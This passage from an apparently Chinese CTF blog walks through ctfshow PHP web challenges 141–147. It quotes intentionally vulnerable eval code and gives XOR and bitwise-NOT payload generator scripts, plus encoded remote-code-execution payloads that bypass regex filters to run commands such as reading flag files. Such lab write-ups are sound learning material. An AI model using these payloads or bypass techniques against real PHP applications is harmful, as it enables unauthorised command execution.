<p>v1和v2随便填，只要能通过第一层验证就行，然后v3就是我们的result，但注意的是这里有个return干扰，所以我们要在v3的payload前边和后面加上一些字符就可以执行命令，例如<code>\+ - *</code> 等等</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119112006494.png" alt="image-20241119112006494"></p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119112031105.png" alt="image-20241119112031105"></p>
<p>换payload传进去就能拿到flag了</p>
<h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><h3 id="学习函数sleep"><a href="#学习函数sleep" class="headerlink" title="#学习函数sleep"></a>#学习函数sleep</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sleep-d"><a href="#sleep-d" class="headerlink" title="sleep($d)"></a>sleep($d)</h4><p>在 PHP 中，<code>sleep($d);</code> 用于将程序暂停执行一段时间，具体时间由变量 <code>$d</code> 所指定。这个函数会使脚本暂停 <code>$d</code> 秒。</p>
<p>可以看到d参数是由(int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d)组成，而0x36d是877的意思，如果我们v1传入的是1的话d参数的值就特别大，我们得等到猴年马月，这里我们直接传0的各种进制数进去就行</p>
<p>payload:v1&#x3D;0</p>
<p>这样的话d就等于0，就能很快出flag了，flag在源码里面</p>
<h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><h3 id="无字母无数字rce异或脚本2-0"><a href="#无字母无数字rce异或脚本2-0" class="headerlink" title="#无字母无数字rce异或脚本2.0"></a>#无字母无数字rce异或脚本2.0</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的v3相对于141过滤了更多，但是我们的异或符号没有被过滤，可以正常使用141的脚本</p>
<p>绕过方法：取反用异或代替，减号用乘或除代替。</p>
<p>但是我们要把脚本里面的preg改成我们现在的过滤</p>
<p>我这里再放一个脚本，这个异或脚本相对来说复制一点点但也很好用</p>
<h4 id="无字母数字rce异或脚本"><a href="#无字母数字rce异或脚本" class="headerlink" title="无字母数字rce异或脚本"></a>无字母数字rce异或脚本</h4><p>php脚本生成可用字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后的payload:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">v3</span>=*(<span class="string">&quot;%0c<span class="variable">%0</span>6%0c%0b<span class="variable">%0</span>5<span class="variable">%0d</span>&quot;</span>^<span class="string">&quot;%7f%7f%7f%7f<span class="variable">%6</span>0<span class="variable">%60</span>&quot;</span>)(<span class="string">&quot;%0b<span class="variable">%0</span>1<span class="variable">%0</span>3<span class="variable">%0</span>0<span class="variable">%0</span>6<span class="variable">%00</span>&quot;</span>^<span class="string">&quot;%7f<span class="variable">%6</span>0<span class="variable">%6</span>0<span class="variable">%2</span>0<span class="variable">%6</span>0<span class="variable">%2a</span>&quot;</span>)*</span><br></pre></td></tr></table></figure>

<h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><h3 id="水题"><a href="#水题" class="headerlink" title="#水题"></a>#水题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题的话就只是相对于141来说是换了变量的位置，让v2为我们需要处理的字符串，所以做法是一样的</p>
<h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><h3 id="三目运算符绕过正则匹配"><a href="#三目运算符绕过正则匹配" class="headerlink" title="#三目运算符绕过正则匹配"></a>#三目运算符绕过正则匹配</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里没有过滤取反符号~,但是过滤了异或符号，那我们可以试一下取反</p>
<p>取反脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>但是这里过滤了加减乘除反斜杠</p>
<p>看了大佬的wp，我又学到了一种新方法，就是关于三目运算的构建payload</p>
<p>羽师傅的测试:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>本地测试结果是可以执行，那我们可以使用三目运算符</p>
<p>所以我们的目标是构建<code>eval(&quot;return 1?tac f*:1;&quot;);</code></p>
<p>payload构造类似之前：</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):&amp;v2=<span class="number">1</span>     <span class="comment">//三目运算符</span></span><br></pre></td></tr></table></figure>

<h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><h3 id="逻辑或绕过正则匹配"><a href="#逻辑或绕过正则匹配" class="headerlink" title="#逻辑或绕过正则匹配"></a>#逻辑或绕过正则匹配</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面忘记放脚本了，这里放一个脚本</p>
<h4 id="查看可用字符脚本"><a href="#查看可用字符脚本" class="headerlink" title="查看可用字符脚本"></a>查看可用字符脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">///&#x27; ( ) , = ? [ \ ] ` &#123; | ~ </span></span><br></pre></td></tr></table></figure>

<p>这样的话可以用的字符就一目了然了</p>
<p>这里可以看到三木运算符的:被禁用了，我们可以用逻辑或运算符试一下</p>
<p>本地测试:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1|phpinfo()|die(&#x27;world&#x27;);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现是可以跑的通的</p>
<p>那就直接构造payload</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v<span class="number">1</span><span class="operator">=</span><span class="number">1</span>&amp;v<span class="number">3</span><span class="operator">=</span>|(~<span class="variable">%8</span>C<span class="variable">%86</span><span class="variable">%8</span>C<span class="variable">%8</span>B<span class="variable">%9</span>A<span class="variable">%92</span>)(~<span class="variable">%8</span>B<span class="variable">%9</span>E<span class="variable">%9</span>C<span class="variable">%DF</span><span class="variable">%99</span><span class="variable">%D5</span>)|&amp;v<span class="number">2</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><h3 id="正则匹配-a-z0-9-isD"><a href="#正则匹配-a-z0-9-isD" class="headerlink" title="#正则匹配&#x2F;^[a-z0-9_]*$&#x2F;isD"></a>#正则匹配&#x2F;^[a-z0-9_]*$&#x2F;isD</h3><h3 id="考点：create-function函数注入"><a href="#考点：create-function函数注入" class="headerlink" title="#考点：create_function函数注入"></a>#考点：create_function函数注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="preg-match-‘-a-z0-9-isD’-ctfshow"><a href="#preg-match-‘-a-z0-9-isD’-ctfshow" class="headerlink" title="preg_match(‘&#x2F;^[a-z0-9_]*$&#x2F;isD’,$ctfshow)"></a>preg_match(‘&#x2F;^[a-z0-9_]*$&#x2F;isD’,$ctfshow)</h4><h5 id="正则表达式详解"><a href="#正则表达式详解" class="headerlink" title="正则表达式详解"></a>正则表达式详解</h5><ul>
<li><strong><code>^</code></strong>: 表示字符串的开始。</li>
<li>&#96;[a-z0-9_]*:<ul>
<li><code>[a-z0-9_]</code>: 这部分表示一个字符集合，匹配任意小写字母 (<code>a-z</code>)、数字 (<code>0-9</code>) 或下划线 (<code>_</code>)。</li>
<li><code>*</code>: 量词，表示前面的字符集合可以出现零次或多次。</li>
</ul>
</li>
<li><strong><code>$</code></strong>: 表示字符串的结束。</li>
</ul>
<h5 id="正则表达式修饰符"><a href="#正则表达式修饰符" class="headerlink" title="正则表达式修饰符"></a>正则表达式修饰符</h5><ul>
